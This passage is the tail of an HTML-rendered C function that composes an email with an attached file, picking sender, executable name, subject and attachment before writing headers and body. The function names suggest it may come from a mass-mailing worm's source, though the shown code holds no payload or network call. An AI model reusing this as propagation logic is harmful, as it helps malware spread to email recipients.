    </span><span class="sc11">select_from</span><span class="sc10">(&amp;</span><span class="sc11">state</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">select_exename</span><span class="sc10">(&amp;</span><span class="sc11">state</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">select_subject</span><span class="sc10">(&amp;</span><span class="sc11">state</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">select_attach_file</span><span class="sc10">(&amp;</span><span class="sc11">state</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">state</span><span class="sc10">.</span><span class="sc11">buffer_size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">8096</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">4</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">state</span><span class="sc10">.</span><span class="sc11">attach_size</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">state</span><span class="sc10">.</span><span class="sc11">buffer_size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc11">state</span><span class="sc10">.</span><span class="sc11">buffer_size</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1023</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc4">1024</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">1024</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">state</span><span class="sc10">.</span><span class="sc11">buffer</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">GlobalAlloc</span><span class="sc10">(</span><span class="sc11">GMEM_FIXED</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">GMEM_ZEROINIT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">state</span><span class="sc10">.</span><span class="sc11">buffer_size</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">state</span><span class="sc10">.</span><span class="sc11">buffer</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">err</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">state</span><span class="sc10">.</span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">write_headers</span><span class="sc10">(&amp;</span><span class="sc11">state</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">write_body</span><span class="sc10">(&amp;</span><span class="sc11">state</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">err</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">state</span><span class="sc10">.</span><span class="sc11">is_tempfile</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">state</span><span class="sc10">.</span><span class="sc11">attach_file</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">state</span><span class="sc10">.</span><span class="sc11">buffer</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">err</span><span class="sc10">:</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">state</span><span class="sc10">.</span><span class="sc11">is_tempfile</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">state</span><span class="sc10">.</span><span class="sc11">attach_file</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">state</span><span class="sc10">.</span><span class="sc11">buffer</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">GlobalFree</span><span class="sc10">((</span><span class="sc11">HGLOBAL</span><span class="sc10">)</span><span class="sc11">state</span><span class="sc10">.</span><span class="sc11">buffer</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
